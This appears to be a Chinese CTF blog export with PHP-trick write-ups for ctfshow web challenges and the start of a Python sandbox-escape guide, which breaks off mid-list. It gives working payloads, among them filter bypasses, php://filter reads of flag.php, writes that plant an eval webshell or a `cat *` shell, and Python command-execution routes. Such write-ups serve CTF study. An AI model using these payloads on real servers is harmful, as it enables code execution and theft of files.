&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    eval(&quot;echo new $v1($v2());&quot;);&#125;?&gt;

payload：?v1=FilesystemIterator&amp;v2=getcwd
16、$GLOBALS全局变量的使用&amp;web111$GLOBALS — 引用全局作用域中可用的全部变量一个包含了全部变量的全局组合数组。变量的名字就是数组的键。
构造出var_dump($GLOBALS);可以输出全部变量值，包括自定义
&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123;    eval(&quot;$$v1 = &amp;$$v2;&quot;);    var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123;    $v1 = $_GET[&#x27;v1&#x27;];    $v2 = $_GET[&#x27;v2&#x27;];    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v1))&#123;            die(&quot;error v1&quot;);    &#125;    if(preg_match(&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;, $v2))&#123;            die(&quot;error v2&quot;);    &#125;    if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123;            getFlag($v1,$v2);    &#125;&#125;?&gt;

$$v1 = &amp;$$v2;：在这句代码中，$v1和$v2的值是一个变量名，然后右侧变量的值会赋值给左侧变量
按照我们所掌握的，$v1可以是任意值，所以构造playload为：?v1=ctfshow&amp;v2=GLOBALS，最后得到了所有变量的值，然后可以看到flag其实就是变量flag的值
17、php伪协议绕过is_file；highlight_file对于php伪协议的使用&amp;web112&amp;web114is_file判断给定文件名是否为一个正常的文件，返回值为布尔类型。is_file会认为php伪协议不是文件。但highlight_file认为伪协议可以是文件。
if(! is_file($file))&#123;    highlight_file($file);&#125;else&#123;    echo &quot;hacker!&quot;;&#125;

如上的代码，可以传入php伪协议进行绕过并且显示含有flag的文件。若有过滤，可以换其他伪协议或改编码方式
&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123;    if(preg_match(&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123;        die(&quot;hacker!&quot;);    &#125;else&#123;        return $file;    &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123;    highlight_file(filter($file));&#125;else&#123;    echo &quot;hacker!&quot;;&#125;

本题题目过滤掉了一部分的过滤器，但是还有许多其他过滤器可以使用，当然本题我们也可以不适用过滤器
payload为：?file=php://filter/resource=flag.php
18、多写根目录绕过is_file&amp;web113在linux中&#x2F;proc&#x2F;self&#x2F;root是指向根目录的，也就是如果在命令行中输入ls &#x2F;proc&#x2F;self&#x2F;root，其实显示的内容是根目录下的内容
这利用函数所能处理的长度限制进行目录溢出： 原理：&#x2F;proc&#x2F;self&#x2F;root代表根目录，进行目录溢出，超过is_file能处理的最大长度就不认为是个文件了
如上面的代码，也可以用下面payload代替
file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php

这个按理说也是文件的，但is_file认为不是
19、trim函数的绕过+is_numeric绕过&amp;web115这两个函数一起检测时，is_numeric认为内容里有%09 %0a %0b %0c %0d %20也算数字，跟trim一起测试一下
for ($i=0; $i &lt;=128 ; $i++) &#123;     $x=chr($i).&#x27;1&#x27;;   if(trim($x)!==&#x27;1&#x27; &amp;&amp;  is_numeric($x))&#123;        echo urlencode(chr($i)).&quot;\n&quot;;   &#125;&#125;

除了+-.号以外还有只剩下%0c也就是换页符了，trim默认时没有剔除%0c。形如以下代码可以绕过
if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27;)&#123;    if($num==&#x27;36&#x27;)&#123;        echo $flag;    &#125;else&#123;        echo &quot;hacker!!&quot;;    &#125;&#125;

payload:num=%0c36
20、绕过死亡die（利用过滤器UCS-2LE UCS-2BE）function filter($x)&#123;    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;$file=$_GET[&#x27;file&#x27;];$contents=$_POST[&#x27;contents&#x27;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);

这道看了羽师傅wp，过滤了许多协议，这是取一个 UCS-2LE UCS-2BE
payload:file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phppost:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?

这会将字符两位两位交换，file_put_contents在写入的时候会破坏那句die，但contents那句恢复原貌，可以执行
21、通过内置bash命令构造命令在许多命令被过滤时，可以一个字母一个字母得构造，而这些字母从内置变量里面截，比如构造nl，可以写为下面这种方式
$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125;

在linux中可以用~获取变量的最后几位，也可以写为$&#123;PATH:~0&#125;$&#123;PWD:~0&#125;，字母与0作用一样，$&#123;PATH:~A&#125;$&#123;PWD:~A&#125;也是nl，flag.php也过滤了的话可以用????.???，具体情况，具体对待
22、PHP变量名非法字符&amp;web123比如传入AA_BB.CC这个变量，PHP是不允许变量名中含有. 的，会默认将不合法字符替换为_,如下：
&lt;?php var_dump($_POST);?&gt;         传值：AA.BB.CC=14输出：array(1) &#123; [&quot;AA_BB_CC&quot;]=&gt; string(2) &quot;14&quot; &#125;

但输入AA[BB.CC它就只替换 [ 输出 array(1) { [“AA_BB.CC”]&#x3D;&gt; string(2) “14” }
&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);           if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;

这题post传进去的变量CTF_SHOW和变量CTF_SHOW.COM都不能为空，然后变量fl0g为空才能够满足条件
但是变量名CTF_SHOW.COM中有非法字符，按照上面的方法进行绕过，所以构造的payload为：CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag
23、gettext拓展的使用var_dump(call_user_func($f1,$f2));

如以上代码，多重过滤后，f1可以为gettext，f2可以为phpinfo，如果过滤更为严格，更改ini文件里的拓展后， _() 等效于 gettext()
&lt;?phpecho gettext(&quot;phpinfo&quot;);结果  phpinfoecho _(&quot;phpinfo&quot;);结果 phpinfo

24、正则最大回溯次数绕过PHP 为了防止正则表达式的拒绝服务攻击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。
也就是说前面100万个字母，后面是语句就好，如下面的例子
if(preg_match(&#x27;/.+?ABC/is&#x27;, $f))&#123;        die(&#x27;bye!&#x27;);    &#125;    if(stripos($f, &#x27;ABC&#x27;) === FALSE)&#123;        die(&#x27;bye!!&#x27;);    &#125;    echo $flag;

前面100万个字母后面ABC就可以echo $flag
25、调用类中的函数-&gt;用于动态语境处理某个类的某个实例::可以调用一个静态的、不依赖于其他初始化的类方法
也就是说双冒号不用实例化类就可以调用类中的静态方法
class ctfshow&#123;    function __wakeup()&#123;        die(&quot;private class&quot;);    &#125;    static function getFlag()&#123;        echo file_get_contents(&quot;flag.php&quot;);    &#125;&#125;call_user_func($_POST[&#x27;ctfshow&#x27;]);

这个传入ctfshow&#x3D;ctfshow::getFlag即可
26、return绕过eval(&quot;return 1;phpinfo();&quot;);会发现是无法执行phpinfo()的，但是php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();是可以执行phpinfo()命令的。
题目web89include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;&#125;

preg_match当检测的变量是数组的时候会报错并返回0。而intval函数当传入的变量也是数组的时候，会返回1；所以可以通过数组绕过
web90(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;

payload：?num=4476.0
web92(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;

由于 $num==4476是弱比较，对于类型不看重，只要最后的值是一样的就行，所以之前的科学计数法什么的都不能够成功绕过，所以需要把4476转为8进制等其他进制的数字来绕过
web93(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125; 

八进制绕过：?num=010574
web94(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;

strpos函数是PHP中用于查找字符串中第一次出现指定子字符串的位置的函数。
strpos($num, &quot;0&quot;)： $num是一个字符串，想要查找的子字符串是 “0”
题目里要求输入的内容里面必须包含0，并且不包含字母，不能强等于4476，在经过intval函数后还要等于4476，所以payload：num=4476.0
web95(intval)include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]|\./i&quot;, $num))&#123;        die(&quot;no no no!!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!!!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125; 

可以通过八进制绕过，但是前面必须多加一个字节：?num=+010574
web97(md5)include(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;	if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])		if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))			echo $flag;		else			print &#x27;Wrong.&#x27;;&#125;?&gt;

数组绕过：a[]=1&amp;b[]=2
web100&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123;    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;        if(preg_match(&quot;/\;/&quot;, $v3))&#123;            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);        &#125;    &#125;    &#125;?&gt;

is_numeric()函数用于判断一个变量是否为数字或数字字符串。如果变量是数字或数字字符串，则返回 true，否则返回 false
在PHP中，逻辑运算符and会比=的优先级低，所以在这个表达式中，=会先执行，然后才是and，所以当其中一个为数字，另外两个不是数字时，$v0的值将取决于第一个条件的结果，因为逻辑运算符and会被视为最后一个操作符。因此，$v0将被赋值为第一个条件的结果，而不会考虑后续条件。
payload：?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=/**/;
web102&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123;    $s = substr($v2,2);    $str = call_user_func($v1,$s);    echo $str;    file_put_contents($v3,$str);&#125;else&#123;    die(&#x27;hacker&#x27;);&#125;?&gt;

call_user_func() 调用方法或变量,第一个参数是调用的对象，第二个参数是被调用对象的参数
file_put_contents() 用来写文件进去，第一个参数是文件名，第二个参数是需要写进文件中的内容，文件名支持伪协议
payload： 参数分析： v1是调用方法v2是数字字符串，且是写进文件中的内容 v3是文件名（可通过伪协议来创建）
v3&#x3D;php://filter/write=convert.base64-decode/resource=2.php v2:写进2.php的内容 ——&gt; 查看当前页面源码；&lt;?&#x3D;cat *; ——&gt; 转为base64为PD89YGNhdCAqYDs ——&gt;转为16进制的ascii码为5044383959474e6864434171594473——&gt;绕过截断，在前面随意加两位数字225044383959474e6864434171594473 v1：将数字字符串还原为base64码 ——&gt; hex2bin
最终payload： v1=hex2bin v2=225044383959474e6864434171594473 v3=php://filter/write=convert.base64-decode/resource=2.php
web105&lt;?phphighlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123;    if($key===&#x27;error&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123;    if($value===&#x27;flag&#x27;)&#123;        die(&quot;what are you doing?!&quot;);    &#125;    $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;    die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\n&quot;;die($suces);?&gt;

payload：?suces=flag；post：error=suces
$key=suces,$suces=$flag,$error=$suces=$flag

web107&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123;    $v1 = $_POST[&#x27;v1&#x27;];    $v3 = $_GET[&#x27;v3&#x27;];       parse_str($v1,$v2);       if($v2[&#x27;flag&#x27;]==md5($v3))&#123;           echo $flag;       &#125;&#125;?&gt;

payload：get:?v3=0；post:v1=flag=cfcd208495d565ef66e7dff9f98764da
web125&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123;    if(!preg_match(&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123;         eval(&quot;$c&quot;.&quot;;&quot;);         if($fl0g===&quot;flag_give_me&quot;)&#123;             echo $flag;         &#125;    &#125;&#125;?&gt;

与上一题相比多禁止flag|GLOBALS|echo|var_dump|print，因此我们需要换一种思路
我们可以利用include函数来包含flag.php
因此我们post传参：CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=include$_GET[1]，get传参：?1=php://filter/convert.base64-encode/resource=flag.php
得到base64编码后的文件内容，拿去解密后就可以得到flag了
引用来源: Tajang的大千世界文章作者: Tajang文章链接: https://ctfking.com/2021/07/14/php-te-xing-zong-jie/
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>python沙盒逃逸</title>
    <url>/2024/03/19/python%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[引用Python 沙箱逃逸的经验总结
执行系统命令基础知识在 Python 中执行系统命令的方式有：

os
commands：仅限2.x
subprocess
timeit：timeit.sys、timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)
platform：platform.os、platform.sys、platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read()
pty：pty.spawn(&#39;ls&#39;)、pty.os
bdb：bdb.os、cgi.sys
cgi：cgi.os、cgi.sys
…

以下为一个脚本测试了一下所有的导入 os 或者 sys 的库：
#-*- coding:utf8 -*-# By Macr0phag3# in 2019-05-07 19:46:12# ------------------------------------# this, antigravity 库删掉all_modules_2 = [    &#x27;BaseHTTPServer&#x27;, &#x27;imaplib&#x27;, &#x27;shelve&#x27;, &#x27;Bastion&#x27;, &#x27;anydbm&#x27;, &#x27;imghdr&#x27;, &#x27;shlex&#x27;, &#x27;CDROM&#x27;, &#x27;argparse&#x27;, &#x27;imp&#x27;, &#x27;shutil&#x27;, &#x27;CGIHTTPServer&#x27;, &#x27;array&#x27;, &#x27;importlib&#x27;, &#x27;signal&#x27;, &#x27;Canvas&#x27;, &#x27;ast&#x27;, &#x27;imputil&#x27;, &#x27;site&#x27;, &#x27;ConfigParser&#x27;, &#x27;asynchat&#x27;, &#x27;inspect&#x27;, &#x27;sitecustomize&#x27;, &#x27;Cookie&#x27;, &#x27;asyncore&#x27;, &#x27;io&#x27;, &#x27;smtpd&#x27;, &#x27;DLFCN&#x27;, &#x27;atexit&#x27;, &#x27;itertools&#x27;, &#x27;smtplib&#x27;, &#x27;Dialog&#x27;, &#x27;audiodev&#x27;, &#x27;json&#x27;, &#x27;sndhdr&#x27;, &#x27;DocXMLRPCServer&#x27;, &#x27;audioop&#x27;, &#x27;keyword&#x27;, &#x27;socket&#x27;, &#x27;FileDialog&#x27;, &#x27;base64&#x27;, &#x27;lib2to3&#x27;, &#x27;spwd&#x27;, &#x27;FixTk&#x27;, &#x27;bdb&#x27;, &#x27;linecache&#x27;, &#x27;sqlite3&#x27;, &#x27;HTMLParser&#x27;, &#x27;binascii&#x27;, &#x27;linuxaudiodev&#x27;, &#x27;sre&#x27;, &#x27;IN&#x27;, &#x27;binhex&#x27;, &#x27;locale&#x27;, &#x27;sre_compile&#x27;, &#x27;MimeWriter&#x27;, &#x27;bisect&#x27;, &#x27;logging&#x27;, &#x27;sre_constants&#x27;, &#x27;Queue&#x27;, &#x27;bsddb&#x27;, &#x27;lsb_release&#x27;, &#x27;sre_parse&#x27;, &#x27;ScrolledText&#x27;, &#x27;bz2&#x27;, &#x27;macpath&#x27;, &#x27;ssl&#x27;, &#x27;SimpleDialog&#x27;, &#x27;cPickle&#x27;, &#x27;macurl2path&#x27;, &#x27;stat&#x27;, &#x27;SimpleHTTPServer&#x27;, &#x27;cProfile&#x27;, &#x27;mailbox&#x27;, &#x27;statvfs&#x27;, &#x27;SimpleXMLRPCServer&#x27;, &#x27;cStringIO&#x27;, &#x27;mailcap&#x27;, &#x27;string&#x27;, &#x27;SocketServer&#x27;, &#x27;calendar&#x27;, &#x27;markupbase&#x27;, &#x27;stringold&#x27;, &#x27;StringIO&#x27;, &#x27;cgi&#x27;, &#x27;marshal&#x27;, &#x27;stringprep&#x27;, &#x27;TYPES&#x27;, &#x27;cgitb&#x27;, &#x27;math&#x27;, &#x27;strop&#x27;, &#x27;Tix&#x27;, &#x27;chunk&#x27;, &#x27;md5&#x27;, &#x27;struct&#x27;, &#x27;Tkconstants&#x27;, &#x27;cmath&#x27;, &#x27;mhlib&#x27;, &#x27;subprocess&#x27;, &#x27;Tkdnd&#x27;, &#x27;cmd&#x27;, &#x27;mimetools&#x27;, &#x27;sunau&#x27;, &#x27;Tkinter&#x27;, &#x27;code&#x27;, &#x27;mimetypes&#x27;, &#x27;sunaudio&#x27;, &#x27;UserDict&#x27;, &#x27;codecs&#x27;, &#x27;mimify&#x27;, &#x27;symbol&#x27;, &#x27;UserList&#x27;, &#x27;codeop&#x27;, &#x27;mmap&#x27;, &#x27;symtable&#x27;, &#x27;UserString&#x27;, &#x27;collections&#x27;, &#x27;modulefinder&#x27;, &#x27;sys&#x27;, &#x27;_LWPCookieJar&#x27;, &#x27;colorsys&#x27;, &#x27;multifile&#x27;, &#x27;sysconfig&#x27;, &#x27;_MozillaCookieJar&#x27;, &#x27;commands&#x27;, &#x27;multiprocessing&#x27;, &#x27;syslog&#x27;, &#x27;__builtin__&#x27;, &#x27;compileall&#x27;, &#x27;mutex&#x27;, &#x27;tabnanny&#x27;, &#x27;__future__&#x27;, &#x27;compiler&#x27;, &#x27;netrc&#x27;, &#x27;talloc&#x27;, &#x27;_abcoll&#x27;, &#x27;contextlib&#x27;, &#x27;new&#x27;, &#x27;tarfile&#x27;, &#x27;_ast&#x27;, &#x27;cookielib&#x27;, &#x27;nis&#x27;, &#x27;telnetlib&#x27;, &#x27;_bisect&#x27;, &#x27;copy&#x27;, &#x27;nntplib&#x27;, &#x27;tempfile&#x27;, &#x27;_bsddb&#x27;, &#x27;copy_reg&#x27;, &#x27;ntpath&#x27;, &#x27;termios&#x27;, &#x27;_codecs&#x27;, &#x27;crypt&#x27;, &#x27;nturl2path&#x27;, &#x27;test&#x27;, &#x27;_codecs_cn&#x27;, &#x27;csv&#x27;, &#x27;numbers&#x27;, &#x27;textwrap&#x27;, &#x27;_codecs_hk&#x27;, &#x27;ctypes&#x27;, &#x27;opcode&#x27;, &#x27;_codecs_iso2022&#x27;, &#x27;curses&#x27;, &#x27;operator&#x27;, &#x27;thread&#x27;, &#x27;_codecs_jp&#x27;, &#x27;datetime&#x27;, &#x27;optparse&#x27;, &#x27;threading&#x27;, &#x27;_codecs_kr&#x27;, &#x27;dbhash&#x27;, &#x27;os&#x27;, &#x27;time&#x27;, &#x27;_codecs_tw&#x27;, &#x27;dbm&#x27;, &#x27;os2emxpath&#x27;, &#x27;timeit&#x27;, &#x27;_collections&#x27;, &#x27;decimal&#x27;, &#x27;ossaudiodev&#x27;, &#x27;tkColorChooser&#x27;, &#x27;_csv&#x27;, &#x27;difflib&#x27;, &#x27;parser&#x27;, &#x27;tkCommonDialog&#x27;, &#x27;_ctypes&#x27;, &#x27;dircache&#x27;, &#x27;pdb&#x27;, &#x27;tkFileDialog&#x27;, &#x27;_ctypes_test&#x27;, &#x27;dis&#x27;, &#x27;pickle&#x27;, &#x27;tkFont&#x27;, &#x27;_curses&#x27;, &#x27;distutils&#x27;, &#x27;pickletools&#x27;, &#x27;tkMessageBox&#x27;, &#x27;_curses_panel&#x27;, &#x27;doctest&#x27;, &#x27;pipes&#x27;, &#x27;tkSimpleDialog&#x27;, &#x27;_elementtree&#x27;, &#x27;dumbdbm&#x27;, &#x27;pkgutil&#x27;, &#x27;toaiff&#x27;, &#x27;_functools&#x27;, &#x27;dummy_thread&#x27;, &#x27;platform&#x27;, &#x27;token&#x27;, &#x27;_hashlib&#x27;, &#x27;dummy_threading&#x27;, &#x27;plistlib&#x27;, &#x27;tokenize&#x27;, &#x27;_heapq&#x27;, &#x27;email&#x27;, &#x27;popen2&#x27;, &#x27;trace&#x27;, &#x27;_hotshot&#x27;, &#x27;encodings&#x27;, &#x27;poplib&#x27;, &#x27;traceback&#x27;, &#x27;_io&#x27;, &#x27;ensurepip&#x27;, &#x27;posix&#x27;, &#x27;ttk&#x27;, &#x27;_json&#x27;, &#x27;errno&#x27;, &#x27;posixfile&#x27;, &#x27;tty&#x27;, &#x27;_locale&#x27;, &#x27;exceptions&#x27;, &#x27;posixpath&#x27;, &#x27;turtle&#x27;, &#x27;_lsprof&#x27;, &#x27;fcntl&#x27;, &#x27;pprint&#x27;, &#x27;types&#x27;, &#x27;_md5&#x27;, &#x27;filecmp&#x27;, &#x27;profile&#x27;, &#x27;unicodedata&#x27;, &#x27;_multibytecodec&#x27;, &#x27;fileinput&#x27;, &#x27;pstats&#x27;, &#x27;unittest&#x27;, &#x27;_multiprocessing&#x27;, &#x27;fnmatch&#x27;, &#x27;pty&#x27;, &#x27;urllib&#x27;, &#x27;_osx_support&#x27;, &#x27;formatter&#x27;, &#x27;pwd&#x27;, &#x27;urllib2&#x27;, &#x27;_pyio&#x27;, &#x27;fpformat&#x27;, &#x27;py_compile&#x27;, &#x27;urlparse&#x27;, &#x27;_random&#x27;, &#x27;fractions&#x27;, &#x27;pyclbr&#x27;, &#x27;user&#x27;, &#x27;_sha&#x27;, &#x27;ftplib&#x27;, &#x27;pydoc&#x27;, &#x27;uu&#x27;, &#x27;_sha256&#x27;, &#x27;functools&#x27;, &#x27;pydoc_data&#x27;, &#x27;uuid&#x27;, &#x27;_sha512&#x27;, &#x27;future_builtins&#x27;, &#x27;pyexpat&#x27;, &#x27;warnings&#x27;, &#x27;_socket&#x27;, &#x27;gc&#x27;, &#x27;quopri&#x27;, &#x27;wave&#x27;, &#x27;_sqlite3&#x27;, &#x27;genericpath&#x27;, &#x27;random&#x27;, &#x27;weakref&#x27;, &#x27;_sre&#x27;, &#x27;getopt&#x27;, &#x27;re&#x27;, &#x27;webbrowser&#x27;, &#x27;_ssl&#x27;, &#x27;getpass&#x27;, &#x27;readline&#x27;, &#x27;whichdb&#x27;, &#x27;_strptime&#x27;, &#x27;gettext&#x27;, &#x27;repr&#x27;, &#x27;wsgiref&#x27;, &#x27;_struct&#x27;, &#x27;glob&#x27;, &#x27;resource&#x27;, &#x27;xdrlib&#x27;, &#x27;_symtable&#x27;, &#x27;grp&#x27;, &#x27;rexec&#x27;, &#x27;xml&#x27;, &#x27;_sysconfigdata&#x27;, &#x27;gzip&#x27;, &#x27;rfc822&#x27;, &#x27;xmllib&#x27;, &#x27;_sysconfigdata_nd&#x27;, &#x27;hashlib&#x27;, &#x27;rlcompleter&#x27;, &#x27;xmlrpclib&#x27;, &#x27;_testcapi&#x27;, &#x27;heapq&#x27;, &#x27;robotparser&#x27;, &#x27;xxsubtype&#x27;, &#x27;_threading_local&#x27;, &#x27;hmac&#x27;, &#x27;runpy&#x27;, &#x27;zipfile&#x27;, &#x27;_warnings&#x27;, &#x27;hotshot&#x27;, &#x27;sched&#x27;, &#x27;zipimport&#x27;, &#x27;_weakref&#x27;, &#x27;htmlentitydefs&#x27;, &#x27;select&#x27;, &#x27;zlib&#x27;, &#x27;_weakrefset&#x27;, &#x27;htmllib&#x27;, &#x27;sets&#x27;, &#x27;abc&#x27;, &#x27;httplib&#x27;, &#x27;sgmllib&#x27;, &#x27;aifc&#x27;, &#x27;ihooks&#x27;, &#x27;sha&#x27;]all_modules_3 = [    &#x27;AptUrl&#x27;, &#x27;hmac&#x27;, &#x27;requests_unixsocket&#x27;, &#x27;CommandNotFound&#x27;, &#x27;apport&#x27;, &#x27;hpmudext&#x27;, &#x27;resource&#x27;, &#x27;Crypto&#x27;, &#x27;apport_python_hook&#x27;, &#x27;html&#x27;, &#x27;rlcompleter&#x27;, &#x27;DistUpgrade&#x27;, &#x27;apt&#x27;, &#x27;http&#x27;, &#x27;runpy&#x27;, &#x27;HweSupportStatus&#x27;, &#x27;apt_inst&#x27;, &#x27;httplib2&#x27;, &#x27;scanext&#x27;, &#x27;LanguageSelector&#x27;, &#x27;apt_pkg&#x27;, &#x27;idna&#x27;, &#x27;sched&#x27;, &#x27;NvidiaDetector&#x27;, &#x27;aptdaemon&#x27;, &#x27;imaplib&#x27;, &#x27;secrets&#x27;, &#x27;PIL&#x27;, &#x27;aptsources&#x27;, &#x27;imghdr&#x27;, &#x27;secretstorage&#x27;, &#x27;Quirks&#x27;, &#x27;argparse&#x27;, &#x27;imp&#x27;, &#x27;select&#x27;, &#x27;UbuntuDrivers&#x27;, &#x27;array&#x27;, &#x27;importlib&#x27;, &#x27;selectors&#x27;, &#x27;UbuntuSystemService&#x27;, &#x27;asn1crypto&#x27;, &#x27;inspect&#x27;, 